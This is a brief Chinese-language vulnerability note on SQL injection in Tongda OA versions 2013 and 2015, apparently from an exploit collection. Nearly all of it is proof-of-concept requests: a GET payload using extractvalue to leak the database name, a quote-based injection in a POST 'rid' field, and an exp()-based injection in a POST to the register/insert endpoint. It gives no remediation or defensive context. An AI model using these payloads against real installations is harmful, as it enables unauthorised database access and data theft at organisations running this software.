## 通达oa sql注入

### 漏洞影响

2013、2015版本

### 复现过程

poc

`http://url/general/mytable/intel_view/workflow.php?MAX_COUNT=15 procedure analyse(extrac tvalue(rand(),concat(0x3a,database())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55&MODULE_ID=Math.random`

```bash
http://url/general/document/index.php/recv/register/turn    

post(_SERVER=&rid=1')
```

```bash
http://url/general/document/index.php/recv/register/insert  

post:   
title)values("'"^exp(if(1%3d2,1,710)))#=1&_SERVER=
```